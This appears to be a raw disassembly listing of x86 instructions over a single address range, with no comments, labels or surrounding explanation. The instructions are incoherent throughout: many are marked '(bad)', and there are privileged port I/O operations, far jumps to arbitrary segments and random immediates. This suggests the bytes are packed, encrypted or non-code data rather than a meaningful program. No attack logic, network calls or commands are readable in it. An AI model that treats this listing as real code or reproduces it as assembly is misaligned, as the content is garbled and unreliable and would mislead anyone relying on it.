  41528a:	add    al,0x44
  41528c:	not    WORD PTR [ebx]
  41528f:	inc    ebp
  415290:	jp     0x41528a
  415292:	jae    0x41528b
  415294:	fadd   QWORD PTR [ebp+0x42e22289]
  41529a:	mov    edx,0x3e7741c8
  41529f:	out    dx,al
  4152a0:	pop    edi
  4152a1:	int    0x2f
  4152a3:	scas   al,BYTE PTR es:[edi]
  4152a4:	xchg   edi,eax
  4152a5:	fsubp  st(7),st
  4152a7:	iret   
  4152a8:	fwait
  4152a9:	ja     0x4152e1
  4152ab:	mov    bl,0xde
  4152ad:	jno    0x41529a
  4152af:	jp     0x415272
  4152b1:	mov    bh,dh
  4152b3:	dec    ebx
  4152b4:	fst    QWORD PTR [ecx-0x269ec143]
  4152ba:	bound  ecx,QWORD PTR [edx-0x5d93dc94]
  4152c0:	or     eax,0x6d37970b
  4152c5:	nop
  4152c6:	push   edx
  4152c7:	sti    
  4152c8:	dec    eax
  4152c9:	aas    
  4152ca:	mov    ebp,0xfb81d533
  4152cf:	push   esi
  4152d0:	pushf  
  4152d1:	int3   
  4152d2:	adc    DWORD PTR [edx-0x56],ebx
  4152d5:	jp     0x415268
  4152d7:	xor    dh,ah
  4152d9:	aaa    
  4152da:	sbb    DWORD PTR [ebp+0x76b3a6e],esp
  4152e0:	ss xchg ebx,eax
  4152e2:	out    dx,al
  4152e3:	dec    eax
  4152e4:	leave  
  4152e5:	aas    
  4152e6:	cmp    ah,BYTE PTR [edi-0x13953d55]
  4152ec:	mov    BYTE PTR [eax],0x84
  4152ef:	clc    
  4152f0:	add    dl,BYTE PTR [esi+esi*1-0x4f7d0cff]
  4152f7:	in     eax,0xff
  4152f9:	push   ds
  4152fa:	clc    
  4152fb:	out    0x52,al
  4152fd:	adc    BYTE PTR ds:0x14e24cf9,bh
  415303:	rol    ah,0xcb
  415306:	in     al,0x7d
  415308:	(bad)  
  415309:	lods   al,BYTE PTR ds:[esi]
  41530a:	test   DWORD PTR [ebp-0x27e8b4ad],edi
  415310:	(bad)
  415313:	rol    DWORD PTR [eax+0x94d0a9e],cl
  415319:	mov    ecx,0x23fd6493
  41531e:	jecxz  0x415308
  415320:	shl    BYTE PTR [ecx+0x2c93a8d9],cl
  415326:	out    dx,al
  415327:	arpl   WORD PTR [ecx-0x1f],sp
  41532a:	mov    ch,0xb2
  41532c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41532d:	scas   al,BYTE PTR es:[edi]
  41532e:	(bad)  
  41532f:	cmp    al,0xf1
  415331:	test   al,0x79
  415333:	add    bl,BYTE PTR [ebx]
  415335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415336:	add    dh,BYTE PTR [edi+eiz*2+0x50]
  41533a:	daa    
  41533b:	push   ss
  41533c:	mov    edx,0xe74c5939
  415341:	ret    0x3ba9
  415344:	or     eax,0xc7e02b18
  415349:	cld    
  41534a:	fs push cs
  41534c:	pop    es
  41534d:	gs ss push ds
  415350:	adc    al,ch
  415352:	test   BYTE PTR ds:0xef75f2b2,0xe7
  415359:	lds    eax,FWORD PTR [esi+0x65]
  41535c:	sar    BYTE PTR [esp+ecx*2],0xd0
  415360:	mov    ebp,DWORD PTR [esi+eiz*4-0x75]
  415364:	into   
  415365:	xchg   ebp,eax
  415366:	ja     0x4153a6
  415368:	mov    cl,0x22
  41536a:	std    
  41536b:	pop    es
  41536c:	push   eax
  41536d:	and    esi,DWORD PTR [eax-0x49]
  415370:	daa    
  415371:	push   edx
  415372:	lea    edx,[eax+esi*1-0x23]
  415376:	adc    esp,esi
  415378:	cmp    DWORD PTR [edx+ebp*4-0x70],0x43
  41537d:	pop    ebx
  41537e:	dec    eax
  41537f:	cli    
  415380:	pop    edx
  415381:	add    dh,BYTE PTR [ebp+0x1b]
  415384:	adc    ah,al
  415386:	repnz cmp cl,al
  415389:	stos   DWORD PTR es:[edi],eax
  41538a:	cs retf 0xa01f
  41538e:	daa    
  41538f:	xlat   BYTE PTR ds:[ebx]
  415390:	aaa    
  415391:	fisub  DWORD PTR [ecx+eax*1-0xf0bf6e6]
  415398:	pop    ebp
  415399:	mov    WORD PTR [esi-0x20],es
  41539c:	add    al,0x45
  41539e:	add    eax,0x8ed4161f
  4153a3:	mov    bh,0xb2
  4153a5:	mov    cl,0x48
  4153a7:	and    al,0xdb
  4153a9:	sti    
  4153aa:	jecxz  0x415339
  4153ac:	add    al,0x15
  4153ae:	sbb    eax,0xa5e29d8f
  4153b3:	xchg   edi,eax
  4153b4:	lods   eax,DWORD PTR ds:[esi]
  4153b5:	mov    ss,WORD PTR [ecx+0x49d9372e]
  4153bb:	aaa    
  4153bc:	sbb    al,0xdc
  4153be:	pop    ds
  4153bf:	inc    ebp
  4153c0:	push   ds
  4153c1:	imul   ebx,DWORD PTR [edx+edi*8-0x754c6b23],0xffffff9b
  4153c9:	mov    dh,cl
  4153cb:	aas    
  4153cc:	test   ah,dl
  4153ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153cf:	mov    esp,0xd3daddb8
  4153d4:	nop
  4153d5:	add    al,0xaa
  4153d7:	mov    ah,0x74
  4153d9:	rcl    edi,cl
  4153db:	pop    edx
  4153dc:	and    al,0x73
  4153de:	scas   al,BYTE PTR es:[edi]
  4153df:	push   es
  4153e0:	add    BYTE PTR [edi+0x3da15455],0xb3
  4153e7:	inc    ecx
  4153e8:	pop    ds
  4153e9:	pop    ebp
  4153ea:	ins    DWORD PTR es:[edi],dx
  4153eb:	or     al,0x79
  4153ed:	mov    bh,bh
  4153ef:	cmp    al,0x8
  4153f1:	mov    cs,eax
  4153f3:	mov    ebx,0xe4642d22
  4153f8:	and    eax,ebx
  4153fa:	jmp    0x415412
  4153fc:	push   0x87fb594
  415401:	fild   QWORD PTR [esi]
  415403:	jge    0x415448
  415405:	shr    DWORD PTR [esi-0x5b],cl
  415408:	mov    bh,0x50
  41540a:	add    eax,0x874f7873
  41540f:	jnp    0x41547f
  415411:	push   ss
  415412:	xor    BYTE PTR [ebx-0x3b],al
  415415:	push   ss
  415416:	dec    esp
  415417:	(bad)  
  415418:	push   ss
  415419:	cdq    
  41541a:	push   edi
  41541b:	data16 mov bh,0x50
  41541e:	outs   dx,BYTE PTR ds:[esi]
  41541f:	push   ebx
  415420:	call   0xca44a0a0
  415425:	repz xor BYTE PTR [eax+0x113de41b],ah
  41542c:	and    al,0x9d
  41542e:	cmp    dh,BYTE PTR [ecx-0x122e2b56]
  415434:	mov    ebx,0x860440d9
  415439:	bndstx [eax-0x1a],bnd2
  41543d:	sub    bl,BYTE PTR [ecx-0x5]
  415440:	out    0x80,al
  415442:	or     eax,DWORD PTR [ebx]
  415444:	cmp    DWORD PTR [eax],ebp
  415446:	test   eax,0x1707d203
  41544b:	adc    al,BYTE PTR [eax-0x1e2df93d]
  415451:	inc    edi
  415452:	or     al,0x34
  415454:	add    DWORD PTR [edx+0x7c],ebx
  415457:	pop    edx
  415458:	(bad)  
  415459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41545a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41545b:	or     al,0x51
  41545d:	fnsave [ecx-0x2]
  415460:	jl     0x415420
  415462:	sub    DWORD PTR [edx-0x54bfa73f],eax
  415468:	adc    al,0x69
  41546a:	inc    ebp
  41546b:	lods   al,BYTE PTR ds:[esi]
  41546c:	test   eax,0x9632434e
  415471:	pop    ds
  415472:	cmp    DWORD PTR [eax],edi
  415474:	jmp    0x34b0c911
  415479:	fbstp  TBYTE PTR [esi+0x7d]
  41547c:	mov    ebx,0xf053c7d6
  415481:	mov    ch,0x3
  415483:	pushf  
  415484:	imul   ebp,edi,0xffffffa2
  415487:	(bad)  
  415488:	into   
  415489:	outs   dx,DWORD PTR ds:[esi]
  41548a:	call   0x25c6:0xa913afb4
  415491:	fcmovu st,st(0)
  415493:	xchg   edi,eax
  415494:	dec    esp
  415495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415496:	push   eax
  415497:	dec    edx
  415498:	lahf   
  415499:	retf   
  41549a:	mov    dh,0x66
  41549c:	push   ebp
  41549d:	inc    edi
  41549e:	mov    dl,0x84
  4154a0:	rol    BYTE PTR [ecx+esi*1+0x446794b5],0x48
  4154a8:	(bad)  
  4154aa:	push   eax
  4154ab:	js     0x415464
  4154ad:	rcr    BYTE PTR [ecx-0x66ab254c],cl
  4154b3:	push   esp
  4154b4:	fisub  DWORD PTR [edx-0x11e71994]
  4154ba:	enter  0xa7a0,0xb9
  4154be:	or     DWORD PTR [edi+0x74df8023],edi
  4154c4:	fimul  DWORD PTR [edi]
  4154c6:	ds xchg ebx,eax
  4154c8:	xor    ebp,edi
  4154ca:	ins    BYTE PTR es:[edi],dx
  4154cb:	popf   
  4154cc:	dec    esp
  4154cd:	sbb    ebp,ebx
  4154cf:	aam    0x74
  4154d1:	or     DWORD PTR [esi-0x336d6ebf],esi
  4154d7:	in     eax,0xff
  4154d9:	inc    edx
  4154da:	in     al,dx
  4154db:	xor    DWORD PTR [edx],ebx
  4154dd:	ss inc eax
  4154df:	adc    eax,0x74247e0a
  4154e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154e5:	aam    0x88
  4154e7:	dec    ebp
  4154e8:	jmp    0x52d3:0xdf7867e2
  4154ef:	sub    eax,0x8636ef7c
  4154f4:	(bad)  
  4154f5:	stos   BYTE PTR es:[edi],al
  4154f6:	lods   al,BYTE PTR ds:[esi]
  4154f7:	cmp    eax,0xadc1b7a5
  4154fc:	push   esp
  4154fd:	cld    
  4154fe:	mov    ds:0x9dacbb1b,eax
  415503:	xchg   esp,eax
  415504:	fxch   st(6)
  415506:	xchg   esi,eax
  415507:	adc    al,0x34
  415509:	mov    dl,0x60
  41550b:	add    bl,BYTE PTR ds:[ebx-0x72]
  41550f:	retf   0x195
  415512:	pop    edi
  415513:	cs stc 
  415515:	stc    
  415516:	test   BYTE PTR [esi],cl
  415518:	lea    ecx,[edx-0x480b876d]
  41551e:	in     eax,0x84
  415520:	pop    esp
  415521:	nop
  415522:	adc    esp,DWORD PTR [ebp+0x2d]
  415525:	enter  0x2194,0x89
  415529:	das    
  41552a:	stos   BYTE PTR es:[edi],al
  41552b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41552c:	ret    0xf599
  41552f:	loope  0x4154d0
  415531:	lock call FWORD PTR [ebp+0x6b476e96]
  415538:	cdq    
  415539:	vpcmpgtw xmm5,xmm0,XMMWORD PTR [eax-0x1f9095db]
  415541:	mov    ds:0xc5e5288f,eax
  415546:	pushf  
  415547:	(bad)  
  415548:	fadd   st,st(5)
  41554a:	or     BYTE PTR [ebx+0x635b808a],0x59
  415551:	fstp   QWORD PTR [edx-0x38b975ab]
  415557:	jle    0x415592
  415559:	jge    0x4155cf
  41555b:	pop    eax
  41555c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41555d:	jg     0x41554f
  41555f:	add    edx,eax
  415561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415563:	jecxz  0x415599
  415565:	adc    ebp,0x8d39bb04
  41556b:	pop    ebx
  41556c:	shl    al,1
  41556e:	pop    ds
  41556f:	dec    edi
  415570:	test   dh,bh
  415572:	pop    eax
  415573:	sahf   
  415574:	cmp    ch,dh
  415576:	pushf  
  415577:	enter  0x5a8a,0x5a
  41557b:	js     0x415528
  41557d:	xchg   BYTE PTR [eax-0x65f92ee8],dh
  415583:	mov    esp,0xfeed0142
  415588:	cmp    al,0xf2
  41558a:	push   0xfffffffd
  41558c:	(bad)  
  41558d:	aad    0x4c
  41558f:	popf   
  415590:	adc    eax,0x70783e5a
  415595:	sbb    al,0xc8
  415597:	bound  esi,QWORD PTR [edx+0x44]
  41559a:	fisttp WORD PTR [edi+eiz*1+0x68f94585]
  4155a1:	int    0x99
  4155a3:	retf   0xeda0
  4155a6:	sbb    al,ah
  4155a8:	xchg   BYTE PTR [ecx],al
  4155aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ab:	fistp  WORD PTR [edi+0x1bccb8da]
  4155b1:	dec    edi
  4155b2:	lea    ebp,[esi-0x54]
  4155b5:	dec    eax
  4155b6:	jle    0x4155c7
  4155b8:	daa    
  4155b9:	xor    BYTE PTR [eax+0x25],al
  4155bc:	push   ebx
  4155bd:	jnp    0x415581
  4155bf:	sbb    al,0xdc
  4155c1:	ds push 0xffffffa0
  4155c4:	pop    edi
  4155c5:	ds inc ebx
  4155c7:	pusha  
  4155c8:	inc    esp
  4155c9:	popf   
  4155ca:	(bad)
  4155ce:	dec    esp
  4155cf:	sub    al,BYTE PTR [ebx+edx*4-0x4d257cc6]
  4155d6:	into   
  4155d7:	mov    cl,0x4
  4155d9:	xor    dh,BYTE PTR [edi-0x1bfc7e54]
  4155df:	adc    eax,0xe2730eb
  4155e4:	cmp    DWORD PTR [ebx-0x311280a7],eax
  4155ea:	lods   al,BYTE PTR ds:[esi]
  4155eb:	add    ch,BYTE PTR [ebx+0xe53290c]
  4155f1:	std    
  4155f2:	or     BYTE PTR [ecx],bh
  4155f4:	add    al,0x77
  4155f6:	popf   
  4155f7:	mul    ebp
  4155f9:	push   ecx
  4155fa:	outs   dx,DWORD PTR ds:[esi]
  4155fb:	ror    DWORD PTR [ebx-0x5c2375b9],cl
  415601:	mov    cl,0x17
  415603:	fcmovnb st,st(7)
  415605:	push   ecx
  415606:	ficomp WORD PTR [esp+ebx*1-0xc]
  41560a:	ins    BYTE PTR es:[edi],dx
  41560b:	adc    al,0x7c
  41560d:	mov    ss,esi
  41560f:	mov    ah,BYTE PTR [ebx+0x1314df84]
  415615:	fldenv [edi+0x57f2d127]
  41561b:	in     eax,0x56
  41561d:	out    dx,eax
  41561e:	test   eax,0xb9e2cb8b
  415623:	repnz es mov ah,0xd
  415627:	gs es jne 0x4155c3
  41562b:	jo     0x4156a8
  41562d:	pop    edi
  41562e:	imul   edi,eax,0xffffffc8
  415631:	sbb    edi,ecx
  415633:	lods   eax,DWORD PTR ds:[esi]
  415634:	push   esp
  415635:	inc    edi
  415636:	sub    al,0x4e
  415638:	xor    ebp,eax
  41563a:	retf   0x3b61
  41563d:	loope  0x415620
  41563f:	add    BYTE PTR [edi-0x6d60eaac],cl
  415645:	lea    ebp,[esi]
  415647:	rcl    dl,cl
  415649:	jae    0x4156b6
  41564b:	mov    BYTE PTR [eax+0x1c2be366],ah
  415651:	jle    0x4155f7
  415653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415654:	push   ebx
  415655:	sbb    al,0xb9
  415657:	jmp    0x3b7e:0xd4cfe7d8
  41565e:	fisubr DWORD PTR [edi]
  415660:	aam    0x30
  415662:	and    DWORD PTR [edx+0x74],esi
  415665:	push   ecx
  415666:	xor    DWORD PTR [esp+ebp*2+0x9],edi
  41566a:	fmul   QWORD PTR [ebp-0x3faa9c2d]
  415670:	jnp    0x41566d
  415672:	dec    esp
  415673:	mov    bh,0x7a
  415675:	mov    bl,cl
  415677:	xchg   edi,eax
  415678:	in     eax,0x39
  41567a:	test   eax,0x320e5b67
  41567f:	outs   dx,BYTE PTR ds:[esi]
  415680:	repz jbe 0x4156b1
  415683:	out    0x4,eax
  415685:	ss popa 
  415687:	int    0x9f
  415689:	imul   eax,DWORD PTR [ecx+esi*1+0x3874664c],0xe873126
  415694:	jmp    0xd111:0x39617639
  41569b:	push   ds
  41569c:	jno    0x4156bc
  41569e:	jnp    0x415713
  4156a0:	outs   dx,BYTE PTR ds:[esi]
  4156a1:	cmp    dh,al
  4156a3:	and    BYTE PTR [esi+0x73030eb7],ch
  4156a9:	cmp    DWORD PTR [eax+eiz*1-0x2fc138bd],ecx
  4156b0:	xor    BYTE PTR [eax+0x51b0a76b],dh
  4156b6:	mov    edx,0x524ddd4
  4156bb:	or     ch,dh
  4156bd:	pop    esp
  4156be:	sbb    ebp,DWORD PTR [esi]
  4156c0:	add    dh,BYTE PTR [ecx-0x4191ce9a]
  4156c6:	sbb    al,0x6a
  4156c8:	and    eax,0x87e90175
  4156cd:	inc    ebx
  4156ce:	xchg   esp,eax
  4156cf:	mov    ebp,0x15412588
  4156d4:	xor    edx,DWORD PTR ds:0xe76eeb87
  4156da:	xor    DWORD PTR [ebp+0x67d22e8e],0xffffff8a
  4156e1:	stos   DWORD PTR es:[edi],eax
  4156e2:	adc    BYTE PTR [ebx+edi*8+0x74],bl
  4156e6:	inc    BYTE PTR [edi+0x13bbca7c]
  4156ec:	js     0x41574c
  4156ee:	jmp    0xb07a21a3
  4156f3:	imul   ebx,DWORD PTR ds:0xb81b6fab,0x60
  4156fa:	mov    eax,0xf256372d
  4156ff:	cmp    al,0xe1
  415701:	data16 add al,0xe9
  415704:	(bad)  
  415705:	sub    eax,0xc1fcf91e
  41570a:	shl    DWORD PTR [eax],1
  41570c:	out    dx,al
  41570d:	scas   eax,DWORD PTR es:[edi]
  41570e:	sbb    dl,cl
  415710:	sti    
  415711:	adc    al,0x12
  415713:	push   ecx
  415714:	inc    esi
  415715:	add    eax,0xb664088b
  41571a:	jne    0x4156c0
  41571c:	aas    
  41571d:	push   edx
  41571e:	pusha  
  41571f:	cwde   
  415720:	cwde   
  415721:	fcmovnb st,st(3)
  415723:	cmp    esi,esi
  415725:	(bad)  
  415726:	outs   dx,DWORD PTR ds:[esi]
  415727:	pop    ds
  415728:	jmp    0x71b8:0xe39f251a
  41572f:	xchg   edi,eax
  415730:	fld    DWORD PTR [ecx-0x48]
  415733:	loope  0x4156fb
  415735:	test   eax,0xdb5d54db
  41573a:	or     al,0x3e
  41573c:	lahf   
  41573d:	mov    eax,ds:0x2194590b
  415742:	pop    esp
  415743:	out    dx,al
  415744:	jmp    0x41572e
  415746:	out    0x66,eax
  415748:	mov    WORD PTR [ecx+0x2d208ead],gs
  41574e:	pop    edx
  41574f:	mov    dl,dl
  415751:	jb     0x415763
  415753:	dec    ecx
  415754:	sbb    bl,BYTE PTR [ebp+0x4d]
  415757:	mov    ds:0x2f36e6dd,al
  41575c:	test   eax,0x7fd8d9d7
  415761:	mov    ds:0x8c3119b0,eax
  415766:	mov    ch,0xc2
  415768:	jg     0x415788
  41576a:	cwde   
  41576b:	adc    eax,0x8cba22ef
  415770:	shr    DWORD PTR [esp+ebp*2+0x7a],0x9d
  415775:	adc    DWORD PTR [edx+0x3d],ecx
  415778:	iret   
  415779:	jecxz  0x41579b
  41577b:	cmp    DWORD PTR [esi+0x14],eax
  41577e:	retf   
  41577f:	push   ds
  415780:	(bad)  
  415781:	vmovhlps xmm0,xmm4,xmm7
  415785:	sub    bh,BYTE PTR [edi-0x2a]
  415788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415789:	mov    bl,0x38
  41578b:	push   cs
  41578c:	fadd   DWORD PTR [edi]
  41578e:	daa    
  41578f:	jg     0x41573e
  415791:	jne    0x415747
  415793:	stos   DWORD PTR es:[edi],eax
  415794:	or     DWORD PTR [edi+ecx*8],esp
  415797:	adc    edx,DWORD PTR [eax-0x6d]
  41579a:	pop    esi
  41579b:	mov    eax,0x3361bfb
  4157a0:	int    0xae
  4157a2:	cli    
  4157a3:	xor    eax,0x37949e82
  4157a8:	pusha  
  4157a9:	repnz xor al,0x6c
  4157ac:	sub    DWORD PTR [ebp-0x576bb3ff],edi
  4157b2:	mov    ch,0xfa
  4157b4:	adc    dl,BYTE PTR [esi-0x7951f5bf]
  4157ba:	pop    eax
  4157bb:	inc    eax
  4157bc:	pop    es
  4157bd:	retf   
  4157be:	mov    ch,0x8b
  4157c0:	cmp    al,0x7e
  4157c2:	daa    
  4157c3:	sub    bl,ah
  4157c5:	or     ch,dh
  4157c7:	jmp    DWORD PTR [ecx]
  4157c9:	push   ebx
  4157ca:	ins    DWORD PTR es:[edi],dx
  4157cb:	cli    
  4157cc:	popa   
  4157cd:	add    ch,dl
  4157cf:	jmp    0xaf55:0x3b23f9f
  4157d6:	iret   
  4157d7:	cmc    
  4157d8:	adc    DWORD PTR [ebx+0x6438061a],esp
  4157de:	and    eax,0x5474adb7
  4157e3:	add    eax,DWORD PTR [edi+esi*2-0x2d]
  4157e7:	or     eax,0x4dd84869
  4157ec:	lahf   
  4157ed:	lds    eax,FWORD PTR [ebx+0x3f]
  4157f0:	test   BYTE PTR [edi],0x40
  4157f3:	ret    
  4157f4:	xor    DWORD PTR [ebp+ebp*8-0x59],edx
  4157f8:	sbb    edx,ecx
  4157fa:	mov    al,0x6a
  4157fc:	daa    
  4157fd:	pop    edx
  4157fe:	sbb    al,0xe5
  415800:	mov    ch,0xaa
  415802:	dec    ebx
  415803:	in     al,dx
  415804:	pop    ss
  415805:	aaa    
  415806:	or     BYTE PTR [edi-0x5],ch
  415809:	mov    ds:0xa5cd1115,al
  41580e:	add    esi,edx
  415810:	cmp    ebx,esi
  415812:	xchg   BYTE PTR [ecx],ch
  415814:	pusha  
  415815:	pushf  
  415816:	lock and BYTE PTR [edx-0x58472455],bl
  41581d:	mov    ebx,0xfa521eb
  415822:	xchg   edx,eax
  415823:	pushf  
  415824:	out    0xcf,al
  415826:	push   0x12a4eca1
  41582b:	fadd   DWORD PTR [edi+eax*2]
  41582e:	scas   eax,DWORD PTR es:[edi]
  41582f:	je     0x415815
  415831:	cwde   
  415832:	outs   dx,BYTE PTR ds:[esi]
  415833:	mov    ebp,0xc7a65da7
  415838:	stos   BYTE PTR es:[edi],al
  415839:	loopne 0x4157f1
  41583b:	pusha  
  41583c:	xchg   ecx,eax
  41583d:	(bad)  
  41583e:	jp     0x41585d
  415840:	push   0x85c50893
  415845:	inc    edx
  415846:	shr    ah,cl
  415848:	pop    es
  415849:	sbb    BYTE PTR [ebx-0x2c],dh
  41584c:	push   ebp
  41584d:	adc    BYTE PTR [eax+ebp*1],bh
  415850:	mov    ebp,0x51648be7
  415855:	icebp  
  415856:	or     eax,DWORD PTR [edx]
  415858:	jge    0x415893
  41585a:	jo     0x415895
  41585c:	cld    
  41585d:	or     ebx,DWORD PTR [ecx-0x5d]
  415860:	xchg   ebx,eax
  415861:	mov    al,ds:0xb158b022
  415866:	scas   al,BYTE PTR es:[edi]
  415867:	sbb    esi,edi
  415869:	lock cld 
  41586b:	imul   esi,eax,0x7d0bc9b9
  415871:	sbb    al,0xf4
  415873:	ds call 0xc25f:0x256db00e
  41587b:	xor    al,0x90
  41587d:	ret    0x444f
  415880:	sbb    ch,BYTE PTR [edi]
  415882:	fdivr  QWORD PTR [edi-0x8c81699]
  415888:	xor    DWORD PTR [ebx-0x6],esp
  41588b:	(bad)
  41588f:	pop    esp
  415890:	(bad)  
  415891:	xor    al,0xb6
  415893:	add    eax,0x8fb2f9e8
  415898:	popf   
  415899:	lods   eax,DWORD PTR ds:[esi]
  41589a:	sbb    ebp,edx
  41589c:	mov    al,0xe7
  41589e:	push   cs
  41589f:	fstp   QWORD PTR [ebx]
  4158a1:	mov    eax,ds:0x8abe14f1
  4158a6:	dec    ebx
  4158a7:	cmp    BYTE PTR [esi-0xc9af82a],bl
  4158ad:	cmp    eax,0x5fb908e0
  4158b2:	rcr    BYTE PTR [esi],0x78
  4158b5:	jno    0x415875
  4158b7:	sbb    al,0xfa
  4158b9:	fmul   st(3),st
  4158bb:	scas   al,BYTE PTR es:[edi]
  4158bc:	cmp    ebx,edx
  4158be:	mov    ds,WORD PTR [ebx-0x74ffba77]
  4158c4:	out    0x29,al
  4158c6:	popa   
  4158c7:	cdq    
  4158c8:	xchg   ebp,eax
  4158c9:	repz xor ecx,esi
  4158cc:	sub    esi,DWORD PTR [edi+0x59]
  4158cf:	fdiv   QWORD PTR [esi]
  4158d1:	ret    0x7798
  4158d4:	xchg   edi,eax
  4158d5:	or     BYTE PTR [ebp+eax*1+0x524c1e49],bl
  4158dc:	in     al,0x40
  4158de:	mov    eax,0x360b4e1b
  4158e3:	xor    DWORD PTR [edx-0x1818218e],ecx
  4158e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158ea:	test   al,0xac
  4158ec:	jmp    0x415871
  4158ee:	outs   dx,BYTE PTR ds:[esi]
  4158ef:	(bad)  
  4158f0:	aaa    
  4158f1:	mov    ecx,0x2f30538e
  4158f6:	xchg   ecx,eax
  4158f7:	out    dx,al
  4158f8:	fs pop esi
  4158fa:	xor    BYTE PTR [ecx-0xab18e36],ch
  415900:	sahf   
  415901:	push   ss
  415902:	popf   
  415903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415904:	mov    DWORD PTR [esi-0x20],ebx
  415907:	faddp  st(5),st
  415909:	cmp    BYTE PTR [ebx],ah
  41590b:	cmp    esp,DWORD PTR [edx]
  41590d:	pop    eax
  41590e:	out    0x1d,eax
  415910:	(bad)  
  415911:	pop    esp
  415912:	dec    ecx
  415913:	loopne 0x415966
  415915:	and    eax,0xd38ee3c
  41591a:	retf   0x5bce
  41591d:	add    al,0xdc
  41591f:	and    eax,0x905aac54
  415924:	sbb    ah,0x58
  415927:	mov    WORD PTR [ebx],es
  415929:	(bad)  
  41592a:	out    0x78,eax
  41592c:	fisub  WORD PTR [esi+ebp*2-0x379f222b]
  415933:	sbb    cl,BYTE PTR [ebp+0x1c]
  415936:	imul   ebp,DWORD PTR [edi-0x68],0xf1aaddac
  41593d:	adc    DWORD PTR [eax-0x27fa4e2c],esi
  415943:	xor    bl,al
  415945:	outs   dx,DWORD PTR ds:[esi]
  415946:	mov    cl,0xd3
  415948:	push   ecx
  415949:	dec    edi
  41594a:	and    ecx,eax
  41594c:	mov    ebp,0x7a11e88c
  415951:	push   eax
  415952:	sub    cl,BYTE PTR [edi+0x41]
  415955:	jno    0x4159b3
  415957:	xchg   esi,eax
  415958:	ror    BYTE PTR [eax+0x42307e14],1
  41595e:	sub    edx,edx
  415960:	pop    eax
  415961:	jns    0x41595f
  415963:	pop    es
  415964:	push   es
  415965:	icebp  
  415966:	xchg   edx,eax
  415967:	add    al,0x44
  415969:	xchg   ebp,eax
  41596a:	xor    al,0x0
  41596c:	xor    al,0x33
  41596e:	fwait
  41596f:	outs   dx,DWORD PTR ds:[esi]
  415970:	sbb    eax,0xdc53a75c
  415975:	les    ebp,FWORD PTR [edx+0x7f]
  415978:	cmp    al,0x8b
  41597a:	add    cl,BYTE PTR [ebx]
  41597c:	sbb    al,0xef
  41597e:	out    0x51,eax
  415980:	cs adc eax,0x84ea0884
  415986:	cmp    al,0x3c
  415988:	push   edx
  415989:	jno    0x4159d4
  41598b:	cmp    BYTE PTR [ecx],dl
  41598d:	retf   
  41598e:	lods   al,BYTE PTR ds:[esi]
  41598f:	out    0x1b,al
  415991:	cmp    DWORD PTR [eax],0xffffff83
  415994:	cvttps2pi mm6,QWORD PTR [eax+ebx*1]
  415998:	inc    edi
  415999:	test   DWORD PTR [edi],esp
  41599b:	mov    ebx,0xf10a6160
  4159a0:	sti    
  4159a1:	jmp    0x41593c
  4159a3:	aas    
  4159a4:	mov    ?,esi
  4159a6:	push   edi
  4159a7:	cld    
  4159a8:	lods   eax,DWORD PTR ds:[esi]
  4159a9:	repnz xlat BYTE PTR ds:[ebx]
  4159ab:	sub    BYTE PTR [ecx-0x1e],0x17
  4159af:	fwait
  4159b0:	addr16 jle 0x415a2c
  4159b3:	ins    BYTE PTR es:[edi],dx
  4159b4:	and    al,0xd4
  4159b6:	loope  0x4159dd
  4159b8:	sub    eax,0xcad2b6e4
  4159bd:	cmp    DWORD PTR [ebx],0x13
  4159c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159c1:	sbb    BYTE PTR [ebx],bh
  4159c3:	popa   
  4159c4:	ds push esi
  4159c6:	or     bh,BYTE PTR [edi+0x68]
  4159c9:	inc    esp
  4159ca:	xor    BYTE PTR [ebp-0x66846ea6],dh
  4159d0:	retf   
  4159d1:	pop    esi
  4159d2:	out    0x3a,eax
  4159d4:	(bad)  
  4159d5:	jmp    0x1bcc:0x9ed38e70
  4159dc:	daa    
  4159dd:	or     DWORD PTR [esp+ecx*4-0x2b3de224],ecx
  4159e4:	mov    esp,0xe7c64108
  4159e9:	or     ah,BYTE PTR [ebx]
  4159eb:	xchg   ebx,eax
  4159ec:	cmp    ebp,ebp
  4159ee:	data16 fcomi st,st(0)
  4159f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159f2:	xor    al,0x3d
  4159f4:	jmp    0x4159e2
  4159f6:	repnz mov dh,0x40
  4159f9:	popa   
  4159fa:	pop    edx
  4159fb:	xor    esi,ebp
  4159fd:	pop    ecx
  4159fe:	test   DWORD PTR [ebp+0x1390981e],esi
  415a04:	or     dh,BYTE PTR [ecx+0x6fbe03bc]
  415a0a:	dec    eax
  415a0b:	jb     0x415a03
  415a0d:	les    esp,FWORD PTR [eax+0x6b]
  415a10:	push   ebx
  415a11:	retf   
  415a12:	test   eax,0x78f5acff
  415a17:	sbb    BYTE PTR [eax],dh
  415a19:	dec    ebp
  415a1a:	dec    eax
  415a1b:	test   BYTE PTR [ecx-0x534c72c5],cl
  415a21:	pop    esi
  415a22:	push   0xe67ad283
  415a27:	ins    DWORD PTR es:[edi],dx
  415a28:	add    bl,BYTE PTR [esi-0x54]
  415a2b:	cmp    eax,0xa9269ace
  415a30:	jge    0x415aa2
  415a32:	add    ebp,0xffffffa9
  415a35:	pushf  
  415a36:	and    eax,0x4d23bdb8
  415a3b:	pop    edx
  415a3c:	loopne 0x415a2a
  415a3e:	(bad)  
  415a3f:	addr16 clc 
  415a41:	das    
  415a42:	lea    ebp,[eax-0x2ca8aa48]
  415a48:	mov    esi,0x8a842aef
  415a4d:	mov    dl,0x36
  415a4f:	lock out dx,al
  415a51:	(bad)  
